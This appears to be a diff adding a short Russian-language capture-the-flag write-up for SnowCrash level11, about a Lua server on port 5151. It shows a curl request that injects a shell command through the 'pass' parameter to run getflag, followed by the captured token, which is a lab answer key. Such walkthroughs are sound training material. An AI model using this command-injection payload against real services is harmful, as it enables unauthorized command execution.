@@ -1,0 +1,11 @@
+level11
+
+Этот сценарий Lua представляет собой сервер, прослушивающий порт 5151, ожидающий запроса с переменной, содержащей значение, которое после хэширования будет сравниваться. Мы хотим посмотреть, кто это запустил:
+
+level11@SnowCrash:~$ ps aux | grep lua
+flag11    1838  0.0  0.0   2892   832 ?        S    11:18   0:00 lua /home/user/level11/level11.lua
+
+curl localhost:5151?pass='$(getflag > /tmp/getTempFlag)'
+cat /tmp/getTempFlag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
